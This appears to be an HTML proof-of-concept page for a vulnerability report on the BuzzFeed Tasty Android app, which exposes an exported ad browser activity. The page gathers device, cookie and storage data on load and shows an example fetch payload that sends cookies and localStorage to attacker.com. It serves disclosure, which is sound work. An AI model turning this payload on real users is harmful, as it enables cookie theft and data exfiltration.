<!DOCTYPE html>
<html>
<head>
    <title>BuzzFeed Tasty Security POC</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <style>
        * { 
            margin: 0; padding: 0; box-sizing: border-box;
            -webkit-user-select: none; user-select: none;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            padding: 20px;
            overflow-x: hidden;
            -webkit-tap-highlight-color: transparent;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 2px solid rgba(255, 255, 255, 0.2);
        }
        .critical {
            background: rgba(255, 71, 87, 0.3);
            border: 3px solid #ff4757;
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            margin: 20px 0;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 71, 87, 0.7); }
            50% { transform: scale(1.01); box-shadow: 0 0 20px 10px rgba(255, 71, 87, 0.4); }
        }
        .proof-box {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 10px;
            padding: 20px;
            margin: 15px 0;
            border-left: 5px solid #2ed573;
        }
        .data-display {
            background: rgba(0, 0, 0, 0.5);
            color: #abb2bf;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            overflow-x: auto;
            white-space: pre-wrap;
            margin: 10px 0;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .log-entry {
            background: rgba(255, 255, 255, 0.05);
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            border-left: 3px solid #70a1ff;
        }
        .timestamp {
            color: #70a1ff;
            font-size: 11px;
            opacity: 0.8;
        }
        .button {
            display: inline-block;
            background: linear-gradient(90deg, #ff6b6b, #ee5a24);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 50px;
            font-weight: bold;
            margin: 10px 5px;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
        }
        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.6);
        }
        .js-indicator {
            position: fixed;
            top: 15px;
            right: 15px;
            background: linear-gradient(90deg, #ff4757, #ff6b81);
            color: white;
            padding: 8px 15px;
            border-radius: 25px;
            font-weight: bold;
            font-size: 12px;
            z-index: 9999;
            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.5);
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }
        .vuln-details {
            background: rgba(230, 33, 23, 0.1);
            border: 2px dashed #e62117;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }
        code {
            background: rgba(0, 0, 0, 0.3);
            padding: 3px 8px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            color: #ffd700;
        }
    </style>
    
    <!-- Immediate JavaScript execution -->
    <script>
        // IMMEDIATE EXECUTION - runs before page loads
        (function() {
            'use strict';
            
            // Create immediate visual indicator
            const indicator = document.createElement('div');
            indicator.className = 'js-indicator';
            indicator.id = 'js-active-indicator';
            indicator.innerHTML = '‚ö° JS ACTIVE';
            document.body.appendChild(indicator);
            
            // Immediately change document title
            document.title = 'üö® ' + document.title + ' [JS EXECUTING]';
            
            // Log immediately to console
            console.log('[BUZZFEED_POC_IMMEDIATE] JavaScript executing at: ' + new Date().toISOString());
            console.log('[BUZZFEED_POC_IMMEDIATE] URL: ' + window.location.href);
            console.log('[BUZZFEED_POC_IMMEDIATE] UserAgent: ' + navigator.userAgent);
            
            // Set cookie immediately (if allowed)
            try {
                document.cookie = 'buzzfeed_poc=' + Date.now() + '; path=/; max-age=60';
                console.log('[BUZZFEED_POC_IMMEDIATE] Cookie set successfully');
            } catch(e) {
                console.log('[BUZZFEED_POC_IMMEDIATE] Cookie error:', e.message);
            }
            
            // Create a global variable to prove execution
            window.buzzfeedPocExecuted = true;
            window.buzzfeedPocTimestamp = Date.now();
            
        })();
    </script>
</head>
<body>
    <!-- JavaScript will modify this immediately -->
    <div id="js-banner" style="display: none;">
        <!-- Will be populated by JS -->
    </div>
    
    <div class="container">
        <div class="critical">
            <h1 id="main-title">üîì BUZZFEED TASTY SECURITY VULNERABILITY</h1>
            <h3 id="subtitle">Loading Proof of Concept...</h3>
            <div id="immediate-proof"></div>
        </div>
        
        <div class="proof-box">
            <h2>Proof of JavaScript Execution</h2>
            <div id="proof-content">
                <p>If JavaScript is executing, this content will change...</p>
            </div>
            <div id="execution-log"></div>
        </div>
        
        <div class="proof-box">
            <h2>Accessible Data (Collected via JavaScript)</h2>
            <div id="data-container" class="data-display">
                Collecting data via JavaScript...
            </div>
            <button class="button" onclick="collectMoreData()">Collect More Data</button>
            <button class="button" onclick="simulateAttack()">Simulate Attack Vector</button>
        </div>
        
        <div class="vuln-details">
            <h2>Vulnerability Details</h2>
            <ul>
                <li><strong>Component:</strong> <code>org.prebid.mobile.rendering.views.browser.AdBrowserActivity</code></li>
                <li><strong>Package:</strong> <code>com.buzzfeed.tasty</code></li>
                <li><strong>Manifest Issue:</strong> <code>android:exported="true"</code> without permission</li>
                <li><strong>CWE:</strong> CWE-926 - Improper Export of Android Application Components</li>
                <li><strong>CVSS Estimate:</strong> 7.5-8.0 (High)</li>
                <li><strong>Impact:</strong> Arbitrary JavaScript execution in app context</li>
            </ul>
        </div>
        
        <div class="proof-box">
            <h2>Real-time JavaScript Activity</h2>
            <div id="activity-log"></div>
            <div style="text-align: center; margin: 20px;">
                <div id="animation-container" style="width: 100px; height: 100px; margin: 0 auto;"></div>
            </div>
        </div>
    </div>

    <!-- Main JavaScript -->
    <script>
        // Create a log system
        const logs = [];
        
        function log(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = { time: timestamp, message: message, type: type };
            logs.push(logEntry);
            
            // Add to activity log
            const logDiv = document.createElement('div');
            logDiv.className = 'log-entry';
            logDiv.innerHTML = `
                <span class="timestamp">[${timestamp}]</span>
                <strong>${type.toUpperCase()}:</strong> ${message}
            `;
            document.getElementById('activity-log').prepend(logDiv);
            
            // Also log to console
            console.log(`[BUZZFEED_POC][${type}] ${message}`);
        }
        
        // Method 1: DOM Manipulation (Always works)
        function proveDomManipulation() {
            log('Starting DOM manipulation proof...');
            
            // Change main title
            document.getElementById('main-title').innerHTML = 
                'üîì <span style="color: #ffd700;">BUZZFEED TASTY - VULNERABILITY CONFIRMED</span>';
            document.getElementById('subtitle').textContent = 
                'JavaScript execution verified via DOM manipulation';
            
            // Create proof element
            const proofDiv = document.getElementById('immediate-proof');
            proofDiv.innerHTML = `
                <div style="background: rgba(46, 213, 115, 0.3); padding: 15px; border-radius: 10px; margin: 15px 0;">
                    <h3>‚úÖ DOM MANIPULATION SUCCESSFUL</h3>
                    <p>This content was dynamically generated by JavaScript at ${new Date().toLocaleTimeString()}</p>
                    <p><strong>Proof:</strong> Element creation, styling, and content injection</p>
                </div>
            `;
            
            // Modify proof content
            document.getElementById('proof-content').innerHTML = `
                <div style="background: linear-gradient(90deg, rgba(46,213,115,0.2), rgba(46,213,115,0.4)); 
                          padding: 20px; border-radius: 10px; margin: 15px 0;">
                    <h3>üî• JAVASCRIPT EXECUTION VERIFIED</h3>
                    <p>The following actions were performed by JavaScript:</p>
                    <ul>
                        <li>‚úÖ Document title modified</li>
                        <li>‚úÖ Page content dynamically injected</li>
                        <li>‚úÖ CSS styles applied programmatically</li>
                        <li>‚úÖ Real-time logging active</li>
                        <li>‚úÖ DOM elements created on-the-fly</li>
                    </ul>
                    <p><strong>Execution Time:</strong> ${new Date().toLocaleString()}</p>
                </div>
            `;
            
            log('DOM manipulation proof completed');
            return true;
        }
        
        // Method 2: Data Collection
        function collectAndDisplayData() {
            log('Collecting accessible data...');
            
            const data = {
                // Environment
                timestamp: new Date().toISOString(),
                url: window.location.href,
                origin: window.location.origin,
                referrer: document.referrer,
                
                // Browser/Device
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                vendor: navigator.vendor || 'Unknown',
                cookieEnabled: navigator.cookieEnabled,
                
                // Screen
                screenResolution: `${screen.width}√ó${screen.height}`,
                colorDepth: screen.colorDepth + ' bit',
                viewport: `${window.innerWidth}√ó${window.innerHeight}`,
                devicePixelRatio: window.devicePixelRatio,
                
                // Network
                online: navigator.onLine,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : 'Not available',
                
                // Storage
                cookies: document.cookie || 'No cookies',
                localStorageCount: Object.keys(localStorage).length,
                sessionStorageCount: Object.keys(sessionStorage).length,
                
                // Vulnerability info
                vulnerability: 'AdBrowserActivity exported without protection',
                package: 'com.buzzfeed.tasty',
                component: 'org.prebid.mobile.rendering.views.browser.AdBrowserActivity',
                risk: 'High (CVSS: 7.5-8.0)'
            };
            
            // Display data
            document.getElementById('data-container').textContent = 
                JSON.stringify(data, null, 2);
            
            log('Data collection complete: ' + Object.keys(data).length + ' data points');
            
            // Demonstrate potential exfiltration
            setTimeout(() => {
                log('Demonstrating data exfiltration potential...', 'warning');
                document.getElementById('data-container').innerHTML += 
                    '\n\n‚ö†Ô∏è <strong>ATTACK SIMULATION:</strong> This data could be sent to attacker server:\n' +
                    'fetch("https://attacker.com/steal", {\n' +
                    '  method: "POST",\n' +
                    '  headers: {"Content-Type": "application/json"},\n' +
                    '  body: JSON.stringify(' + JSON.stringify(data).substring(0, 200) + '...)\n' +
                    '})';
            }, 1500);
            
            return data;
        }
        
        // Method 3: Create Canvas Animation (Visual Proof)
        function createCanvasProof() {
            log('Creating canvas animation proof...');
            
            const container = document.getElementById('animation-container');
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 100;
            canvas.style.borderRadius = '10px';
            canvas.style.boxShadow = '0 4px 15px rgba(0,0,0,0.3)';
            
            const ctx = canvas.getContext('2d');
            
            let angle = 0;
            function draw() {
                // Clear canvas
                ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // Draw background
                const gradient = ctx.createLinearGradient(0, 0, canvas.width, 0);
                gradient.addColorStop(0, '#ff4757');
                gradient.addColorStop(1, '#3742fa');
                ctx.fillStyle = gradient;
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // Draw animated text
                ctx.save();
                ctx.translate(canvas.width / 2, canvas.height / 2);
                ctx.rotate(angle);
                
                ctx.fillStyle = 'white';
                ctx.font = 'bold 16px Arial';
                ctx.textAlign = 'center';
                ctx.textBaseline = 'middle';
                ctx.fillText('JS EXECUTING', 0, 0);
                
                ctx.restore();
                
                angle += 0.05;
                
                // Continue animation
                requestAnimationFrame(draw);
            }
            
            container.appendChild(canvas);
            draw();
            
            log('Canvas animation created');
            return canvas;
        }
        
        // Method 4: Simulate Click Events
        function setupInteractiveProof() {
            log('Setting up interactive proof...');
            
            const interactiveDiv = document.createElement('div');
            interactiveDiv.style.cssText = `
                background: rgba(255, 255, 255, 0.1);
                padding: 20px;
                border-radius: 10px;
                margin: 20px 0;
                text-align: center;
            `;
            
            interactiveDiv.innerHTML = `
                <h3>üéÆ Interactive JavaScript Test</h3>
                <p>Click buttons to prove JavaScript event handling:</p>
                <button id="test-btn-1" class="button">Test Button 1</button>
                <button id="test-btn-2" class="button">Test Button 2</button>
                <button id="test-btn-3" class="button">Test Button 3</button>
                <div id="click-results" style="margin-top: 15px; min-height: 50px;"></div>
            `;
            
            document.querySelector('.proof-box').appendChild(interactiveDiv);
            
            // Add click handlers
            let clickCount = 0;
            const buttons = ['test-btn-1', 'test-btn-2', 'test-btn-3'];
            
            buttons.forEach(btnId => {
                document.getElementById(btnId).addEventListener('click', function() {
                    clickCount++;
                    const resultsDiv = document.getElementById('click-results');
                    resultsDiv.innerHTML += `
                        <div class="log-entry">
                            <span class="timestamp">[${new Date().toLocaleTimeString()}]</span>
                            Button "${this.textContent}" clicked! (Total: ${clickCount})
                        </div>
                    `;
                    log(`Button "${this.textContent}" clicked`, 'event');
                });
            });
            
            log('Interactive proof setup complete');
        }
        
        // Method 5: Simulate Attack Vectors
        function simulateAttack() {
            log('Simulating attack vectors...', 'warning');
            
            const attackDiv = document.createElement('div');
            attackDiv.style.cssText = `
                background: rgba(255, 71, 87, 0.2);
                border: 2px solid #ff4757;
                border-radius: 10px;
                padding: 20px;
                margin: 20px 0;
            `;
            
            attackDiv.innerHTML = `
                <h3>‚öîÔ∏è ATTACK VECTOR SIMULATION</h3>
                <p><strong>What an attacker could do with this vulnerability:</strong></p>
                <ol>
                    <li><strong>Cookie Theft:</strong> Access authentication cookies via <code>document.cookie</code></li>
                    <li><strong>LocalStorage Access:</strong> Read/write app storage data</li>
                    <li><strong>UI Spoofing:</strong> Create fake login pages within the app</li>
                    <li><strong>Data Exfiltration:</strong> Send collected data to attacker server</li>
                    <li><strong>Broadcast Injection:</strong> Trigger internal app events</li>
                </ol>
                <div class="data-display">
                    // Example malicious payload:
                    fetch('https://attacker.com/steal', {
                        method: 'POST',
                        body: JSON.stringify({
                            cookies: document.cookie,
                            userAgent: navigator.userAgent,
                            localStorage: JSON.stringify(localStorage)
                        })
                    })
                </div>
                <p style="color: #ffa502; margin-top: 15px;">
                    ‚ö†Ô∏è This is a simulation. No actual attack is performed.
                </p>
            `;
            
            document.querySelector('.proof-box').appendChild(attackDiv);
            
            log('Attack vector simulation displayed', 'warning');
        }
        
        // Method 6: Create Persistent Changes
        function createPersistentProof() {
            // Add to localStorage (if available)
            try {
                localStorage.setItem('buzzfeed_poc_executed', Date.now().toString());
                localStorage.setItem('buzzfeed_poc_url', window.location.href);
                log('Persistent data stored in localStorage');
            } catch(e) {
                log('localStorage not available: ' + e.message, 'warning');
            }
            
            // Create a permanent DOM element
            const permanentMarker = document.createElement('div');
            permanentMarker.id = 'buzzfeed-poc-permanent-marker';
            permanentMarker.style.cssText = `
                position: fixed;
                bottom: 10px;
                left: 10px;
                background: rgba(255, 71, 87, 0.9);
                color: white;
                padding: 5px 10px;
                border-radius: 5px;
                font-size: 10px;
                z-index: 9998;
                opacity: 0.9;
            `;
            permanentMarker.textContent = 'POC: ' + new Date().toLocaleTimeString();
            document.body.appendChild(permanentMarker);
            
            log('Permanent DOM marker created');
        }
        
        // Collect more data on demand
        function collectMoreData() {
            const extraData = {
                collectedAt: new Date().toISOString(),
                pageLoadTime: performance.timing ? 
                    performance.timing.loadEventEnd - performance.timing.navigationStart + 'ms' : 'N/A',
                memory: performance.memory ? {
                    usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1024 / 1024) + 'MB',
                    totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1024 / 1024) + 'MB'
                } : 'N/A',
                timezoneOffset: new Date().getTimezoneOffset(),
                hasTouch: 'ontouchstart' in window,
                maxTouchPoints: navigator.maxTouchPoints || 0
            };
            
            log('Collected additional data: ' + Object.keys(extraData).length + ' points');
            
            const dataContainer = document.getElementById('data-container');
            const currentData = JSON.parse(dataContainer.textContent || '{}');
            const mergedData = { ...currentData, ...extraData };
            dataContainer.textContent = JSON.stringify(mergedData, null, 2);
            
            return extraData;
        }
        
        // Initialize everything
        document.addEventListener('DOMContentLoaded', function() {
            log('DOM fully loaded and parsed');
            
            // Execute all proof methods
            setTimeout(() => {
                proveDomManipulation();
                collectAndDisplayData();
                createCanvasProof();
                setupInteractiveProof();
                createPersistentProof();
                
                // Final confirmation
                setTimeout(() => {
                    document.querySelector('.critical').innerHTML += `
                        <div style="background: rgba(46, 213, 115, 0.3); padding: 15px; border-radius: 10px; margin-top: 20px;">
                            <h3>üéØ VULNERABILITY FULLY DEMONSTRATED</h3>
                            <p><strong>Proof Established:</strong> JavaScript is executing in BuzzFeed Tasty context</p>
                            <p><strong>Vulnerability:</strong> Exported AdBrowserActivity (CWE-926)</p>
                            <p><strong>Impact:</strong> Arbitrary code execution, data access, UI spoofing</p>
                            <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
                        </div>
                    `;
                    
                    log('Vulnerability demonstration completed successfully!', 'success');
                }, 1000);
                
            }, 500);
        });
        
        // Also trigger on window load
        window.onload = function() {
            log('Window fully loaded with all resources');
            console.log('[BUZZFEED_POC_FINAL] All JavaScript executed successfully!');
            console.log('[BUZZFEED_POC_FINAL] Global proof: ' + window.buzzfeedPocExecuted);
        };
    </script>
</body>
</html>
